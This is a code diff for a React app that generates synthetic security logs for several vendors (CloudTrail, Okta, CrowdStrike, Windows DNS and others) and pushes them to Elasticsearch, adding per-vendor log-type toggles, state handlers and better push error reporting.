+function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes,linuxLogTypes,onLinuxLogTypes,oracleLogTypes,onOracleLogTypes,mssqlLogTypes,onMSSQLLogTypes,cloudtrailLogTypes,onCloudtrailLogTypes,oktaLogTypes,onOktaLogTypes,crowdstrikeLogTypes,onCrowdstrikeLogTypes,wdnsLogTypes,onWdnsLogTypes,hostnamePrefix,onHostnamePrefix,hostnameCap,onHostnameCap,includeAdmin,onIncludeAdmin,indexOverride,onIndexOverride}){
   return(
     <div onClick={()=>onToggle(vendor.id)} className={cn("relative cursor-pointer p-4 rounded-xl border-2 transition-all",selected?"border-blue-500 bg-blue-500/10 shadow-lg shadow-blue-500/10":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
       {selected&&<div className="absolute top-2 right-2 w-5 h-5 rounded-full bg-blue-500 flex items-center justify-center"><span className="text-white text-[10px]">✓</span></div>}
-      <div className={cn("w-9 h-9 rounded-lg flex items-center justify-center mb-2.5 text-sm",selected?"bg-blue-500/20":"bg-gray-800")}>
-        {vendor.id==='fortinet'?'🛡'
-        :vendor.id==='paloalto'?'🔥'
-        :vendor.id==='switch'?'🌐'
-        :vendor.id==='email'?'✉️'
-        :vendor.id==='endpoint'?'💻'
-        :vendor.id==='windows'?'🪟'
-        :vendor.id==='oracle'?'🛢'
-        :vendor.id==='mssql'?'🗄'
-        :'🐧'}
+      <div className={cn("w-9 h-9 rounded-lg overflow-hidden mb-2.5",selected?"ring-2 ring-blue-400/50":"")}>
+        <VendorLogo id={vendor.id}/>
       </div>
       <h3 className="font-semibold text-sm text-white mb-0.5">{vendor.name}</h3>
       <p className="text-xs text-gray-400 mb-2.5 line-clamp-2">{vendor.description}</p>
@@ -1547,6 +2244,54 @@ function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRa
                       {label}
                     </button>
                   );
+                })}
+              </div>
+            </div>
+          )}
+          {vendor.id==='cloudtrail'&&(
+            <div className="mb-2">
+              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
+              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
+                {Object.entries(CT_TYPE_LABELS).map(([t,label])=>{
+                  const checked=(cloudtrailLogTypes||CT_TYPES_DEFAULT).includes(t);
+                  const toggle=e=>{e.stopPropagation();const cur=cloudtrailLogTypes||CT_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onCloudtrailLogTypes(next);};
+                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
+                })}
+              </div>
+            </div>
+          )}
+          {vendor.id==='okta'&&(
+            <div className="mb-2">
+              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
+              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
+                {Object.entries(OKTA_TYPE_LABELS).map(([t,label])=>{
+                  const checked=(oktaLogTypes||OKTA_TYPES_DEFAULT).includes(t);
+                  const toggle=e=>{e.stopPropagation();const cur=oktaLogTypes||OKTA_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onOktaLogTypes(next);};
+                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
+                })}
+              </div>
+            </div>
+          )}
+          {vendor.id==='crowdstrike'&&(
+            <div className="mb-2">
+              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
+              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
+                {Object.entries(CS_TYPE_LABELS).map(([t,label])=>{
+                  const checked=(crowdstrikeLogTypes||CS_TYPES_DEFAULT).includes(t);
+                  const toggle=e=>{e.stopPropagation();const cur=crowdstrikeLogTypes||CS_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onCrowdstrikeLogTypes(next);};
+                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
+                })}
+              </div>
+            </div>
+          )}
+          {vendor.id==='wdns'&&(
+            <div className="mb-2">
+              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
+              <div className="grid grid-cols-2 gap-x-1.5 gap-y-1">
+                {Object.entries(WDNS_TYPE_LABELS).map(([t,label])=>{
+                  const checked=(wdnsLogTypes||WDNS_TYPES_DEFAULT).includes(t);
+                  const toggle=e=>{e.stopPropagation();const cur=wdnsLogTypes||WDNS_TYPES_DEFAULT;const next=checked?cur.filter(x=>x!==t):[...cur,t];if(next.length>0)onWdnsLogTypes(next);};
+                  return(<button key={t} type="button" onClick={toggle} className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-medium transition-colors select-none" style={{background:checked?'rgba(34,197,94,0.15)':'rgba(239,68,68,0.15)',border:`1px solid ${checked?'rgba(34,197,94,0.5)':'rgba(239,68,68,0.4)'}`,color:checked?'#86efac':'#fca5a5'}}><span style={{opacity:0.8}}>{checked?'✓':'✗'}</span>{label}</button>);
                 })}
               </div>
             </div>
@@ -1882,6 +2627,10 @@ export default function App(){
   const [linuxLogTypes,setLinuxLogTypes]=useState(LINUX_TYPES_DEFAULT);
   const [oracleLogTypes,setOracleLogTypes]=useState(ORACLE_TYPES_DEFAULT);
   const [mssqlLogTypes,setMSSQLLogTypes]=useState(MSSQL_TYPES_DEFAULT);
+  const [cloudtrailLogTypes,setCloudtrailLogTypes]=useState(CT_TYPES_DEFAULT);
+  const [oktaLogTypes,setOktaLogTypes]=useState(OKTA_TYPES_DEFAULT);
+  const [crowdstrikeLogTypes,setCrowdstrikeLogTypes]=useState(CS_TYPES_DEFAULT);
+  const [wdnsLogTypes,setWdnsLogTypes]=useState(WDNS_TYPES_DEFAULT);
   const [vendorHostnamePrefix,setVendorHostnamePrefix]=useState({windows:'',linux:'',endpoint:''});
   const [vendorHostnameCap,setVendorHostnameCap]=useState({windows:null,linux:null,endpoint:null});
   const [vendorIncludeAdmin,setVendorIncludeAdmin]=useState({endpoint:false,windows:false,linux:false});
@@ -1925,6 +2674,30 @@ export default function App(){
         setVendorMinLogs(p=>({...p,mssql:Math.max(1,sum)}));
         return types;
       });
+    } else if(id==='cloudtrail'){
+      setCloudtrailLogTypes(types=>{
+        const sum=types.reduce((s,t)=>s+(CT_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+        setVendorMinLogs(p=>({...p,cloudtrail:Math.max(1,sum)}));
+        return types;
+      });
+    } else if(id==='okta'){
+      setOktaLogTypes(types=>{
+        const sum=types.reduce((s,t)=>s+(OKTA_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+        setVendorMinLogs(p=>({...p,okta:Math.max(1,sum)}));
+        return types;
+      });
+    } else if(id==='crowdstrike'){
+      setCrowdstrikeLogTypes(types=>{
+        const sum=types.reduce((s,t)=>s+(CS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+        setVendorMinLogs(p=>({...p,crowdstrike:Math.max(1,sum)}));
+        return types;
+      });
+    } else if(id==='wdns'){
+      setWdnsLogTypes(types=>{
+        const sum=types.reduce((s,t)=>s+(WDNS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+        setVendorMinLogs(p=>({...p,wdns:Math.max(1,sum)}));
+        return types;
+      });
     } else {
       const def=VENDOR_LOG_COUNT[id]?.[lvl];
       if(def)setVendorMinLogs(p=>({...p,[id]:def}));
@@ -1966,6 +2739,42 @@ export default function App(){
       return prev;
     });
   },[]);
+  const handleCloudtrailLogTypes=useCallback((types)=>{
+    setCloudtrailLogTypes(types);
+    setVendorRandomness(prev=>{
+      const lvl=prev.cloudtrail||'med';
+      const sum=types.reduce((s,t)=>s+(CT_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+      setVendorMinLogs(p=>({...p,cloudtrail:Math.max(1,sum)}));
+      return prev;
+    });
+  },[]);
+  const handleOktaLogTypes=useCallback((types)=>{
+    setOktaLogTypes(types);
+    setVendorRandomness(prev=>{
+      const lvl=prev.okta||'med';
+      const sum=types.reduce((s,t)=>s+(OKTA_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+      setVendorMinLogs(p=>({...p,okta:Math.max(1,sum)}));
+      return prev;
+    });
+  },[]);
+  const handleCrowdstrikeLogTypes=useCallback((types)=>{
+    setCrowdstrikeLogTypes(types);
+    setVendorRandomness(prev=>{
+      const lvl=prev.crowdstrike||'med';
+      const sum=types.reduce((s,t)=>s+(CS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+      setVendorMinLogs(p=>({...p,crowdstrike:Math.max(1,sum)}));
+      return prev;
+    });
+  },[]);
+  const handleWdnsLogTypes=useCallback((types)=>{
+    setWdnsLogTypes(types);
+    setVendorRandomness(prev=>{
+      const lvl=prev.wdns||'med';
+      const sum=types.reduce((s,t)=>s+(WDNS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+      setVendorMinLogs(p=>({...p,wdns:Math.max(1,sum)}));
+      return prev;
+    });
+  },[]);
   const handleMinLogs=useCallback((id,val)=>{
     const n=Math.max(1,parseInt(val)||1);
     setVendorMinLogs(p=>({...p,[id]:n}));
@@ -2003,21 +2812,21 @@ export default function App(){
         setPool(poolSize,prefix);
         _emailDomain=vid==='email'?(emailDomain.trim()||null):null;
         _includeAdminUsers=['endpoint','windows','linux'].includes(vid)?(vendorIncludeAdmin[vid]||false):false;
-        nl[v.id]=vid==='windows'?generateWindowsEventLogs(vendorTotals[vid],parseInt(timeRange),windowsLogTypes):vid==='linux'?generateLinuxLogs(vendorTotals[vid],parseInt(timeRange),linuxLogTypes):vid==='oracle'?generateOracleLogs(vendorTotals[vid],parseInt(timeRange),oracleLogTypes):vid==='mssql'?generateMSSQLLogs(vendorTotals[vid],parseInt(timeRange),mssqlLogTypes):v.generator(vendorTotals[vid],parseInt(timeRange));
+        nl[v.id]=vid==='windows'?generateWindowsEventLogs(vendorTotals[vid],parseInt(timeRange),windowsLogTypes):vid==='linux'?generateLinuxLogs(vendorTotals[vid],parseInt(timeRange),linuxLogTypes):vid==='oracle'?generateOracleLogs(vendorTotals[vid],parseInt(timeRange),oracleLogTypes):vid==='mssql'?generateMSSQLLogs(vendorTotals[vid],parseInt(timeRange),mssqlLogTypes):vid==='cloudtrail'?generateCloudTrailLogs(vendorTotals[vid],parseInt(timeRange),cloudtrailLogTypes):vid==='okta'?generateOktaLogs(vendorTotals[vid],parseInt(timeRange),oktaLogTypes):vid==='crowdstrike'?generateCrowdStrikeLogs(vendorTotals[vid],parseInt(timeRange),crowdstrikeLogTypes):vid==='wdns'?generateWDNSLogs(vendorTotals[vid],parseInt(timeRange),wdnsLogTypes):v.generator(vendorTotals[vid],parseInt(timeRange));
       });
       _emailDomain=null;
       _hostnamePrefix=null;
       _includeAdminUsers=false;
       setLogs(nl);setGenerating(false);
     },300);
-  },[selected,vendorMinLogs,maxLogs,vendorRandomness,timeRange,emailDomain,windowsLogTypes,linuxLogTypes,oracleLogTypes,mssqlLogTypes]);
+  },[selected,vendorMinLogs,maxLogs,vendorRandomness,timeRange,emailDomain,windowsLogTypes,linuxLogTypes,oracleLogTypes,mssqlLogTypes,cloudtrailLogTypes,oktaLogTypes,crowdstrikeLogTypes,wdnsLogTypes]);
 
   const handlePush=useCallback(async()=>{
     setPushing(true);
     try{
-      const{total,errors,indices}=await pushLogsToElastic(logs,vendorIndexOverride);
-      const idxList=Object.entries(indices).map(([idx,n])=>`${idx}(${n})`).join(', ');
-      if(errors>0)alert(`⚠ Pushed ${total-errors}/${total} logs. ${errors} errors.\n${idxList}`);
+      const{total,errors,indices,sampleErrors}=await pushLogsToElastic(logs,vendorIndexOverride);
+      const idxList=Object.entries(indices).map(([idx,n])=>`${idx}(${n})`).join('\n');
+      if(errors>0){const errDetail=sampleErrors?.slice(0,3).join('\n')||'';alert(`⚠ Pushed ${total-errors}/${total} logs. ${errors} errors.\n\nIndices:\n${idxList}\n\nSample errors:\n${errDetail}`);}
       else alert(`✓ Pushed ${total} logs across ${Object.keys(indices).length} indices\n${idxList}`);
     }catch(e){alert(`Error: ${e.message}`);}
     finally{setPushing(false);}
@@ -2084,7 +2893,7 @@ export default function App(){
               <div className="lg:col-span-3">
                 <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Log Sources</h2>
                 <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-3">
-                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain} windowsLogTypes={windowsLogTypes} onWindowsLogTypes={handleWindowsLogTypes} linuxLogTypes={linuxLogTypes} onLinuxLogTypes={handleLinuxLogTypes} oracleLogTypes={oracleLogTypes} onOracleLogTypes={handleOracleLogTypes} mssqlLogTypes={mssqlLogTypes} onMSSQLLogTypes={handleMSSQLLogTypes} hostnamePrefix={vendorHostnamePrefix[v.id]||''} onHostnamePrefix={handleHostnamePrefix} hostnameCap={vendorHostnameCap[v.id]??null} onHostnameCap={handleHostnameCap} includeAdmin={vendorIncludeAdmin[v.id]||false} onIncludeAdmin={handleIncludeAdmin} indexOverride={vendorIndexOverride[v.id]||''} onIndexOverride={handleIndexOverride}/>)}
+                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain} windowsLogTypes={windowsLogTypes} onWindowsLogTypes={handleWindowsLogTypes} linuxLogTypes={linuxLogTypes} onLinuxLogTypes={handleLinuxLogTypes} oracleLogTypes={oracleLogTypes} onOracleLogTypes={handleOracleLogTypes} mssqlLogTypes={mssqlLogTypes} onMSSQLLogTypes={handleMSSQLLogTypes} cloudtrailLogTypes={cloudtrailLogTypes} onCloudtrailLogTypes={handleCloudtrailLogTypes} oktaLogTypes={oktaLogTypes} onOktaLogTypes={handleOktaLogTypes} crowdstrikeLogTypes={crowdstrikeLogTypes} onCrowdstrikeLogTypes={handleCrowdstrikeLogTypes} wdnsLogTypes={wdnsLogTypes} onWdnsLogTypes={handleWdnsLogTypes} hostnamePrefix={vendorHostnamePrefix[v.id]||''} onHostnamePrefix={handleHostnamePrefix} hostnameCap={vendorHostnameCap[v.id]??null} onHostnameCap={handleHostnameCap} includeAdmin={vendorIncludeAdmin[v.id]||false} onIncludeAdmin={handleIncludeAdmin} indexOverride={vendorIndexOverride[v.id]||''} onIndexOverride={handleIndexOverride}/>)}
                 </div>
               </div>
               <div className="lg:col-span-1">
